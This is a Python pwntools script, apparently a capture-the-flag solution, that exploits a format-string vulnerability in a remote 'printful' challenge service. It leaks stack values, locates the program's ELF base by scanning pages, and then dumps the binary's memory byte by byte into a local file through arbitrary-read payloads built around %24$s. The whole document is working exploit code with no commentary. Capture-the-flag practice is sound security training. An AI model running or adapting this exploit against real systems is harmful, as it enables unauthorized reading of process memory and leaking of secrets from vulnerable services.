#!/usr/bin/env python3

import struct

from pwn import *

chal = remote("printful.challs.pwnoh.io", 1337, ssl=True)


def wait_til_prompt():
    return chal.recvuntil(b"> ")


def dump_byte(address):
    leak_part = b"|%24$s|EOF_prnt"
    out = leak_part.ljust(136, b"A") + b"EOF_prnt" + struct.pack("Q", address)

    chal.sendline(out)

    response = chal.recvuntil(b"EOF_prnt")[: -len(b"EOF_prnt")]
    parts = response.split(b"|")

    if len(parts) >= 2:
        leak = parts[1]
        if len(leak) > 0:
            return leak[0:1]

    return b"\x00"


def leak_position(position, format="p"):
    chal.sendline(f"%{position}${format}EOF_prnt".encode())
    return chal.recvuntil(b"EOF_prnt")[: -len(b"EOF_prnt")]


def get_image_base_address():
    page_aligned_image_leak = int(leak_position(34), 16) & ~0xFFF
    original_page_aligned_image_leak = page_aligned_image_leak

    while True:
        wait_til_prompt()
        chal.sendline(
            f"|%24$s|EOF_prnt".ljust(136, "A").encode()
            + b"EOF_prnt"
            + struct.pack("Q", page_aligned_image_leak)
        )
        response = chal.recvuntil(b"EOF_prnt")[: -len(b"EOF_prnt")]
        if b"ELF" in response:
            break
        page_aligned_image_leak -= 0x1000

    return page_aligned_image_leak


wait_til_prompt()
address = get_image_base_address()

with open("dump.raw", "wb") as f:
    while True:
        print(f"leak 0x{address:08x}")

        packed_address = struct.pack("Q", address)
        if b"\n" in packed_address:
            byte_to_write = b"\x00"
        else:
            try:
                wait_til_prompt()
                byte_to_write = dump_byte(address)
                print(f" -> {repr(byte_to_write)}")
            except EOFError:
                base = get_image_base_address()
                break
            except Exception:
                byte_to_write = b"\x00"

        f.write(byte_to_write)
        f.flush()
        address += 1
